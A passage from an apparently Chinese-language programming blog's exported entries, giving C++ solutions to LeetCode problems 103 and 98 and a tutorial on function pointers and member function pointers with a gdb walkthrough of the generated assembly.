&#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">zigzagLevelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="type">bool</span> leftToRight = <span class="literal">true</span>;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> levelSize = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">levelorderList</span><span class="params">(levelSize)</span></span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; levelSize; i++)&#123;</span><br><span class="line">                TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(leftToRight) levelorderList[i] = current-&gt;val;</span><br><span class="line">                <span class="keyword">else</span> levelorderList[levelSize-i<span class="number">-1</span>] = current-&gt;val;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(current-&gt;left) q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;right) q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            leftToRight = !leftToRight;</span><br><span class="line">            result.<span class="built_in">push_back</span>(levelorderList);</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡大架構一樣會是BFS標準做法，透過一個 <code>levelSize</code> 來去得到當前 level 中的節點數，接著在每一層走訪中，透過變數 <code>leftToRight</code> 控制要正向放入 vector   還是反向</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> leftToRight = <span class="literal">true</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(leftToRight) levelorderList[i] = current-&gt;val;</span><br><span class="line"><span class="keyword">else</span> levelorderList[levelSize-i<span class="number">-1</span>] = current-&gt;val;</span><br><span class="line">... </span><br><span class="line">leftToRight = !leftToRight;</span><br></pre></td></tr></table></figure><p>每一層結束後再更新變數 <code>leftToRight</code></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/103/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$，$N$ 為節點總數</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(N)$，$N$ 為節點總數</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
            <tag> Traversal </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Valid 的二元搜尋樹 | Medium| LeetCode#98. Validate Binary Search Tree</title>
      <link href="/posts/5ebb4e47.html"/>
      <url>/posts/5ebb4e47.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/98/question.jpeg"></p><p><img src="/img/LeetCode/98/question2.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目敘述： 題目給定一個 Binary Tree 的 <code>root</code> ，我們需要確認這棵 Binary Tree 是否是 Binary Search Tree</li></ul><div class="note info flat"><p>一個 valid 的 Binary Search Tree(BST) 包含了：</p><ul><li>對於任意節點，其 Left SubTree 的任意節點值一定小於當前節點值</li><li>對於任意節點，其節點值一定小於其 Right SubTree 的任意節點值</li><li>Left SubTree 和 Right SubTree 都要是 binary search tree</li></ul></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題想法很簡單，這題的花費時間很少，首先可以知道的是： <strong>BST 從小到大走訪，其走訪順序會是對同一棵樹進行 inorder traversal。</strong> 所以只要能夠 <strong>在 Inorder 走訪過程中比較前一個節點值與當前節點值，看前一個節點是否比當前節點小即可</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">bool</span> result =  <span class="literal">true</span>;</span><br><span class="line">    TreeNode* prev = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(current-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(prev &amp;&amp; prev-&gt;val &gt;= current-&gt;val) result = <span class="literal">false</span>;</span><br><span class="line">        prev = current;</span><br><span class="line">        <span class="built_in">dfs</span>(current-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡多宣告了一個節點叫做 <code>prev</code> 用來儲存 inorder traversal 過程中的前一個節點，另外透過一個變數 <code>result</code> 來儲存是否valid的狀態。一旦 <code>prev</code> 存在且大於當前節點，則將 <code>result</code> 狀態變更為 <code>false</code>。在每次visiting 節點過程會將當前節點更新到 <code>prev</code>，以便下一次的比較。</p><p>之後便是回傳結果到 <code>isValidBST</code> 函數中，返回結果。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/98/result.jpeg"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">validate</span>(root, std::numeric_limits&lt;<span class="type">long</span>&gt;::<span class="built_in">min</span>(), std::numeric_limits&lt;<span class="type">long</span>&gt;::<span class="built_in">max</span>() );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">validate</span><span class="params">(TreeNode* node, <span class="type">long</span> lower, <span class="type">long</span> upper)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( node == <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="comment">// empty node or empty tree is valid always</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (lower &lt; node-&gt;val) &amp;&amp; (node-&gt;val &lt; upper) )&#123;</span><br><span class="line"><span class="comment">// check if all tree nodes follow BST rule</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">validate</span>(node-&gt;left, lower, node-&gt;val) &amp;&amp; <span class="built_in">validate</span>(node-&gt;right, node-&gt;val, upper);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// early reject when we find violation</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我看解答區普遍有其他做法，這種作法主要定義了另一個用來確定是否為 BST 的 <code>validate</code> 函數，其中的參數會給定上界和下界，一旦給定的下界小於當前節點值，而當前節點值小於上界，就持續遞迴，將node的左右child分別傳入參數。而其他情形則回傳 false，而return 結果需要左右子樹都是BST <code>return validate(node-&gt;left, lower, node-&gt;val) &amp;&amp; validate(node-&gt;right, node-&gt;val, upper);</code> 最後才會是 valid 結果。  </p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$, $N$ 為節點總數。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(H)$, worst-case: $H &#x3D; N$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Traversal </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 C/C++ 中傳遞函式- 深入 Function Pointer 的記憶體位址變化</title>
      <link href="/posts/bf93d608.html"/>
      <url>/posts/bf93d608.html</url>
      
        <content type="html"><![CDATA[<h1 id="函式指標-Function-Pointer"><a href="#函式指標-Function-Pointer" class="headerlink" title="函式指標 (Function Pointer)"></a>函式指標 (Function Pointer)</h1><blockquote><p>當你透過 C&#x2F;C++ 中宣告一個函式時，就會分配一段起始記憶體位址，而 Function Pointer 就可以用來指向以及儲存函式位址。 所以我們可以直接透過 Function Pointer <strong>1.來呼叫一個函式</strong>  <strong>2.或者將它傳遞給其他函式</strong></p></blockquote><p><img src="/img/c++/func.png"></p><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>宣告：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[回傳值的data type] (* function pointer name)(input parameter1, input parameter2, ...);</span><br></pre></td></tr></table></figure><p><strong>記得需要將函數的位址 assign 給 function pointer</strong>，可以透過取位址運算子 <code>&amp;</code> 來進行，這裡看下方範例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">int</span> (*func_ptr)(<span class="type">int</span>,<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">func_ptr = &amp;add;</span><br><span class="line">result = <span class="built_in">func_ptr</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">cout &lt;&lt; result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這段程式碼執行的輸出結果會是： <code>3</code>。這裡如果的拿先前建構 Binary Tree 的 Class 去整合使用看看，程式碼會像是下面這樣</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare of tree structure</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        TreeNode *left, *right;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">TreeNode</span>():<span class="built_in">val</span>(<span class="number">0</span>),<span class="built_in">left</span>(<span class="literal">nullptr</span>),<span class="built_in">right</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x):<span class="built_in">val</span>(x),<span class="built_in">left</span>(<span class="literal">nullptr</span>),<span class="built_in">right</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x, TreeNode *leftNode, TreeNode *rightNode):<span class="built_in">val</span>(x),<span class="built_in">left</span>(leftNode),<span class="built_in">right</span>(rightNode)&#123;&#125;;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BT</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare of binary tree class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> TreeNode;</span><br><span class="line">        <span class="built_in">BT</span>():<span class="built_in">root</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BT</span>(TreeNode *node):<span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="function">TreeNode* <span class="title">returnRoot</span><span class="params">(TreeNode* root)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">BT::returnRoot</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Declare tree node</span></span><br><span class="line">    TreeNode *nodeA = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="function">BT <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line">    </span><br><span class="line">    TreeNode* (BT::*func_ptr)(TreeNode*);</span><br><span class="line">    func_ptr = &amp;BT::returnRoot;</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; (T.*func_ptr)(T.root)-&gt;val &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前上半段的 <code>class TreeNode</code> 以及 <code>class BT</code>  定義了二元樹的架構，這裡先不理它。可以觀察到我們在BT class 底下宣告了一個函數 <code>returnRoot</code> 他做的事就是將輸入的節點回傳，沒什麼用途。接著看到 <code>main</code>，其中我們只定義了一個節點，其節點值為整數 <code>1</code> ，並且將改節點作為樹的 <code>root</code> ，接著才是使用 function pointer 的地方：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TreeNode* (BT::func_ptr)(TreeNode*);</span><br></pre></td></tr></table></figure><div class="note info flat"><p>這裡定義了一個指向 BT Class member function 的指標，其參數跟回傳值都是 <code>TreeNode*</code><br>參數跟回傳值其實都跟上面的 <code>returnRoot</code> 一樣</p></div><p>我們將BT的成員函數位址取出並交給 <code>func_ptr</code> 指標變數 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func_ptr = &amp;BT::returnRoot;</span><br></pre></td></tr></table></figure><p>接著印出結果，由於 <code>returnRoot</code> 的回傳值會是一個節點，因此這裡印出它的節點值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; (T.*func_ptr)(T.root)-&gt;val &lt;&lt; endl;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>這裡要特別注意，因為 <code>funct_ptr</code> 被宣告為指向任何 BT class 的成員函數的指標，因此在存取的時候需要透過初始化過的 BT class 的物件來存取，這裡會是 <code>T</code></p></div><p>輸出結果： <code>1</code></p><h2 id="成員函數指標"><a href="#成員函數指標" class="headerlink" title="成員函數指標"></a>成員函數指標</h2><p>剛剛可以發現後 Function Pointer 宣告在 <code>main</code> 中去進行存取，<strong>那如果 Function Pointer 想要作為某個 class 內的成員會怎麼樣呢？</strong></p><p>其實自己實驗下來體感上差異在於在 caller (<code>main</code>) 的存取方式:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> TreeNode;</span><br><span class="line">        <span class="comment">//Declare the member function pointer</span></span><br><span class="line">        TreeNode* (BT::*func_ptr)(TreeNode*);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">BT</span>():<span class="built_in">root</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BT</span>(TreeNode *node):<span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function">TreeNode* <span class="title">returnRoot</span><span class="params">(TreeNode* root)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    TreeNode *nodeA = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="function">BT <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line">    <span class="comment">// Assign function address to member function pointer</span></span><br><span class="line">    T.func_ptr = &amp;BT::returnRoot;</span><br><span class="line">    <span class="comment">// Calling member function through member function pointer</span></span><br><span class="line">    cout &lt;&lt; (T.*T.func_ptr)(T.root)-&gt;val &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在 class 中，function pointer 的宣告還是一樣，一樣需要指定這個pointer 是要存取哪個class 的 member function，還是要說清楚。</p></blockquote><p>但在 <code>main</code> 的存取就要小心了，由於該 function pointer 一樣屬於 <code>BT</code> class 裡，因此在 assign function address 的時候一樣需要透過 class object <code>T</code> 來存取function pointer</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T.funt_ptr = &amp;BT::returnt_ptr;</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>而在呼叫的部分，需要更加注意，由於是透過成員函數指標來存取函數</p><ul><li><code>*T.funt_ptr</code> 指向目標成員函數，因此需要另一個物件來呼叫該指標</li><li><code>T.*T.funt_ptr</code> 透過前面的 <code>T</code> 來存取後面用來指向目標函數的指標</li></ul></div><h2 id="Function-Pointer-實際應用"><a href="#Function-Pointer-實際應用" class="headerlink" title="Function Pointer 實際應用"></a>Function Pointer 實際應用</h2><ul><li><strong>Callback Function</strong>: Function Pointer 常常用在 Callback 方式的實踐，像是 Event-Driven 的架構或者 Interrupt Handling 都可以採用</li><li><strong>Dynamic Dispatch</strong>: 在有多個具有相似介面但不同實作（多態, Polymorphism）的函數的情況下，可以使用 Function Pointer 在這些函數之間進行切換。</li><li><strong>Function Table</strong>: Function pointers 可以被存放在 Array 或其他資料結構中，建立 Function Table，根據index 來選擇要呼叫哪個函式</li></ul><blockquote><p>這裡我認為 Function Table 的實現非常強大，像是 Linux Kernel 中維護的 System Call Table 其實也是一個 Function Pointer Table，它將 syscall number mapping 到對應的 kernel 處理函數。每個 system call 都透過一個唯一的 syscall number 索引到這張表中對應的 function pointer<br>詳細原理也可以參考 <a href="https://medium.com/@7FrogTW/powerpc-syscall-%E8%B8%A9%E9%9B%B7%E5%A4%A7%E5%85%A8-75b5d477ac0b">這篇</a></p></blockquote><h1 id="底層流程"><a href="#底層流程" class="headerlink" title="底層流程"></a>底層流程</h1><p>這裡我們換一個範例來實際看看使用 Function Pointer 時候的記憶體變化：</p><p><em>exmaple.cpp</em></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">subtract</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">int</span> (*func_ptr)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">    func_ptr = &amp;add;</span><br><span class="line">    <span class="type">int</span> result1 = <span class="built_in">func_ptr</span>(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    func_ptr = &amp;subtract;</span><br><span class="line">    <span class="type">int</span> result2 = <span class="built_in">func_ptr</span>(<span class="number">10</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Result1: &quot;</span> &lt;&lt; result1 &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Result2: &quot;</span> &lt;&lt; result2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面定義了兩個函式，可以用 Function Pointer 去分別呼叫 <code>add</code> 和 <code>subtract</code> ，這裡我們在Linux 環境中編譯程式，接著啟動 gdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ -g -o func_pointer_test func_pointer_test.cpp</span><br><span class="line">gdb ./func_pointer_test</span><br></pre></td></tr></table></figure><p><img src="/img/c++/gdb1.png"></p><blockquote><p>那我自己是有裝 gdb-peda，畫面好看很多，安裝可以參考 <a href="https://n0a110w.github.io/notes/security-stuff/peda.html">這篇</a></p></blockquote><p><img src="/img/c++/gdb2.png"></p><p>當程式執行到 <code>func_ptr = &amp;add;</code> 時，GDB 暫停了執行，從上面的組合語言可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x555555555203 &lt;main()+12&gt;:  lea    rax,[rip+0xffffffffffffffbf]        # 0x5555555551c9 &lt;_Z3addii&gt;</span><br></pre></td></tr></table></figure><p><code>lea</code> 指令用來計算 memory位址。這裡 <code>RAX</code> 將被設為一個基於 <code>RIP</code> 的偏移地址。這個偏移量應該用來載入 add 函數的地址並存儲在 <code>RAX</code> 中，以後可以通過這個地址來 call add 函數。</p><p>所以這時候可以檢查一下最上方的 <code>RAX</code> 暫存器放了甚麼。 <strong><code>RAX</code> 暫存器被給定 <code>add</code> 函數的位址，這就代表了 function pointer 正在被初始化。</strong></p><p>我們可以看下一行要執行甚麼:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x55555555520a &lt;main()+19&gt;:  mov    QWORD PTR [rbp-0x8],rax</span><br></pre></td></tr></table></figure><p>這行會做的事情就是，將 <code>rax</code> 中的值存入base pointer 位址減掉 <code>0X8</code> 偏移量的的位址，而這應該就是 function pointer 的所在位址 </p><p>接著我們進入下一行指令，可以透過 <code>s</code> 指令來追蹤下一行 (17行)</p><p><img src="/img/c++/GDB3.png"></p><p>現在我們可以檢查看看 